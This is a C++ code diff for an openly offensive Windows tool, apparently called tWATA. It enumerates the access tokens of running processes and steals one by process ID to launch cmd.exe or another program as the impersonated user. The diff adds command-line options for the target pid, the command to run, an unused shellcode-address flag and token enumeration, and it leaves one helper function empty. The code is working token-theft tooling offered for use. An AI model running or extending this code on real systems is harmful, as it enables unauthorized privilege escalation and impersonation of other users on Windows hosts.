@@ -2,6 +2,9 @@
 #include <unordered_map>
 #include <list>
 #include <iostream>
+#include <string>
+#include <codecvt>
+#include "argparse.hpp"
 
 void enumerateProcessess();
 
@@ -15,13 +18,45 @@ struct TOKEN_INFORMATION
 	TELEV tokenElevationType;
 };
 
-void usage()
+std::wstring convert_to_wstring(const std::string& utf8)
 {
-	printf("Usage: .\\tWATA.exe <pid> [<cmd>]");
+
 }
 
-int wmain(int argc, wchar_t* argv[])
+int main(int argc, char* argv[])
 {
+	argparse::ArgumentParser program("tWATA", "1.0.0");
+	program.add_argument("--pid")
+		.help("provide a pid to steal token from")
+		.default_value(0)
+		.scan<'i', int>();
+	program.add_argument("--cmd")
+		.help("provide program to execute on behalf of the impersonated user")
+		.default_value(std::string("C:\\Windows\\System32\\cmd.exe"));
+	program.add_argument("--addr").help("provide an address with a shellcode")
+		.implicit_value(true);
+	program.add_argument("--enumerate").help("enumerate tokens").implicit_value(true);
+
+	try
+	{
+		program.parse_args(argc, argv);
+		if (argc == 1)
+		{
+			std::cout << program;
+			std::exit(1);
+		}
+	}
+	catch (const std::runtime_error& err)
+	{
+		std::cerr << err.what() << std::endl;
+		std::cerr << program;
+		std::exit(1);
+	}
+
+	int pid = program.get<int>("--pid");
+	std::string cmd = program.get<std::string>("--cmd");
+	std::wstring wcmd (cmd.begin(), cmd.end());
+
 	HANDLE hProcessSnap;
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
@@ -78,9 +113,10 @@ int wmain(int argc, wchar_t* argv[])
 			}
 		}
 	} while (Process32Next(hProcessSnap, &pe32));
+
 	CloseHandle(hProcessSnap);
 
-	if (argc == 1)
+	if (program.is_used("--enumerate"))
 	{
 		int i = 0;
 		wprintf(L"Available tokens for impersonation: \n");
@@ -95,48 +131,23 @@ int wmain(int argc, wchar_t* argv[])
 					token.pid, token.tokenStatistics.tokenType, token.tokenStatistics.impersonationLevel, token.tokenElevationType.isElevated, token.tokenElevationType.elevationType, token.tokenIntegrityLevel.integrityLevel);
 			}
 		}
-		usage();
 	}
-	else if (argc == 2)
+	
+	if (program.is_used("--pid"))
 	{
-		int pid;
-		wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
-
-		try
-		{
-			pid = std::stoi(argv[1]);
-		}
-		catch (const std::invalid_argument& e)
-		{
-			std::cout << "Invalid argument provided -> PID should be integer" << std::endl;
-			usage();
-			std::exit(1);
-		}
 		hToken = pid_token[pid];
-		stealToken(hToken, cmd);
-
-	}
-	else if (argc == 3)
-	{
-		int pid;
-		wchar_t* cmd = argv[2];
-
-		try
+		if (program.is_used("--cmd"))
 		{
-			pid = std::stoi(argv[1]);
+			std::vector<wchar_t> buffer(wcmd.begin(), wcmd.end());
+			buffer.push_back(L'\0');
+			wchar_t * cmd = buffer.data();
+			stealToken(hToken, cmd);
 		}
-		catch (const std::invalid_argument& e)
+		else
 		{
-			std::cout << "Invalid argument provided -> PID should be integer" << std::endl;
-			usage();
-			std::exit(1);
+			wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
+			stealToken(hToken, cmd);
 		}
-		hToken = pid_token[pid];
-		stealToken(hToken, cmd);
-	}
-	else
-	{
-		usage();
 	}
 
 	return 0;
